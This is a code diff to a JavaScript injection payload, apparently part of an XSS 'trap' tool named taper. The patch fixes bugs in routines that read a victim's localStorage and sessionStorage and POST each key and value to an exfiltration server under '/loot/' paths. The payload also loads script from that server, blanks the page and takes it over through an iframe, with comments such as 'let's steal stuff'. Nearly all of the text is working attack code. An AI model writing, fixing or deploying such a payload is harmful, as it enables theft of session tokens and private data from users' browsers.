@@ -383,41 +383,47 @@ function checkLocalStorage()
 		value = localStorage.getItem(key)
 		//console.log("~~~ Local storage: {" + key + ", " + value + "}");
 
-		localStorageDict = JSON.parse(sessionStorage.getItem('taperLocalStorage'));
 
-		if (key in localStorageDict)
-		{
-			// Existing local storage key
-			//console.log("!!! Existing localstorage key...");
-			if (localStorageDict[key] != value)
-			{
-				// Existing localStorage, but the value has changed
-				// console.log("     New localStorage value: " + value);
-				// console.log("     Old localStorage value: " + localStorageDict[key]);
-				localStorageDict[key] = value;
-			}
-			else
-			{
-				// Existing cookie, but no change in value to report
-				//console.log("     localStorgae value unchanged");
-				continue;
-			}
+		var localStorageDict = '';
 
-		}
-		else
+		if (sessionStorage.getItem('taperLocalStorage').length > 0)
 		{
-			// New localStorage entry
-			//console.log("++ New localStorage: " + key + ", with value: " + value);
-			localStorageDict[key] = value;
+			localStorageDict = JSON.parse(sessionStorage.getItem('taperLocalStorage'));
+
+			if (key in localStorageDict)
+			{
+				// Existing local storage key
+				//console.log("!!! Existing localstorage key...");
+				if (localStorageDict[key] != value)
+				{
+					// Existing localStorage, but the value has changed
+					// console.log("     New localStorage value: " + value);
+					// console.log("     Old localStorage value: " + localStorageDict[key]);
+					localStorageDict[key] = value;
+				}
+				else
+				{
+					// Existing cookie, but no change in value to report
+					//console.log("     localStorgae value unchanged");
+					continue;
+				}
+			}
 		}
+
+		// New localStorage entry
+		//console.log("++ New localStorage: " + key + ", with value: " + value);
+		localStorageDict[key] = value;
 
 		// Copy dictionary back to session storage
-		sessionStorage.setItem('taperLocalStorage', JSON.stringify(localStorageDict));
+		if (localStorageDict.length > 0)
+		{
+			sessionStorage.setItem('taperLocalStorage', JSON.stringify(localStorageDict));
+		}
 
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/localstore/" + sessionStorage.getItem('tapersessionName'));
+		request.open("POST", taperexfilServer + "/loot/localstore/" + sessionStorage.getItem('taperSessionName'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -440,9 +446,14 @@ function checkSessionStorage()
 		value = sessionStorage.getItem(key)
 		console.log("~~~ Session storage: {" + key + ", " + value + "}");
 
-		if (key === "taperSessionStorage")
+		if (key === "taperSessionStorage" || 
+			key === "taperLocalStorage" || 
+			key === "taperCookieStorage"||
+			key === "taperSessionName" ||
+			key === "taperLastUrl")
 		{
-			// Should skip over our won session storage copy
+			// Should skip over our own session storage for reporting
+			console.log("!!! Found taper data in session storage, hopefully SKIPPING");
 			continue;
 		}
 
@@ -450,26 +461,31 @@ function checkSessionStorage()
 
 		if (sessionStorage.getItem('taperSessionStorage').length > 0)
 		{
+			console.log("+++ taperSessionStorage has length...");
 			sessionStorageDict = JSON.parse(sessionStorage.getItem('taperSessionStorage'));
 
 			if (key in sessionStorageDict)
 			{
 				// Existing local storage key
-				//console.log("!!! Existing localstorage key...");
+				console.log("!!! Existing sessionstorage key...");
 				if (sessionStorageDict[key] != value)
 				{
-				// Existing localStorage, but the value has changed
-				 // console.log("     New sessionStorage value: " + value);
-				 // console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
+					// Existing localStorage, but the value has changed
+				 	console.log("     New sessionStorage value: " + value);
+				 	console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
 					sessionStorageDict[key] = value;
 				}
 				else
 				{
-				// Existing sessionStorage, but no change in value to report
-				// console.log("     sessionStorage value unchanged");
+					// Existing sessionStorage, but no change in value to report
+					console.log("     sessionStorage value unchanged");
 					continue;
 				}
 			}
+		}
+		else
+		{
+			console.log("+++ In else statement for taperSessionStorage length check...");
 		}
 		// else
 		// {
@@ -492,7 +508,7 @@ function checkSessionStorage()
 
 		// Ship it
 		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/sessionstore/" + sessionStorage.getItem('tapersessionName'));
+		request.open("POST", taperexfilServer + "/loot/sessionstore/" + sessionStorage.getItem('taperSessionName'));
 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 		var jsonObj = new Object();
 		jsonObj["key"] = key;
@@ -604,11 +620,11 @@ function runUpdate()
 	// console.log("$$$ href: " + document.getElementById("iframe_a").contentDocument.location.href);
 
 	// New page, let's steal stuff
-	if (sessionStorage.getItem('taperlastUrl') != currentUrl)
+	if (sessionStorage.getItem('taperLastUrl') != currentUrl)
 	{
 		// Handle URL recording
 		console.log("New trap URL, stealing the things: " + currentUrl);
-		sessionStorage.setItem('taperlastUrl', currentUrl);
+		sessionStorage.setItem('taperLastUrl', currentUrl);
 
 		// This needs an API call to report the new page
 		// and take a screenshot maybe, not sure if
@@ -773,8 +789,8 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 	initTaperVars();
 
 	console.log("!!!! Loading payload!");
-// Blank the page so it doesn't show through as users 
-// navigate inside the iframe
+	// Blank the page so it doesn't show through as users 
+	// navigate inside the iframe
 
 	if (window.taperMode === "trap")
 	{
@@ -783,7 +799,7 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 	}
 
 
-// Pull in html2canvas
+	// Pull in html2canvas
 	var js = document.createElement("script");
 	js.type = "text/javascript";
 	js.src = taperexfilServer + "/lib/telemhelperlib.js";
@@ -797,21 +813,12 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 	console.log("HTML2CANVAS added to DOM");
 
 
-// Pull in jszip
-// js = document.createElement("script");
-// js.type = "text/javascript";
-// js.src = "http://localhost:8444/lib/compress.js";
-// document.body.appendChild(js);
-
-
-// Pick our session ID
+	// Pick our session ID
 	initSession();
 
 
 // Trap all the things
 	takeOver();
-
-
 }
 else
 {
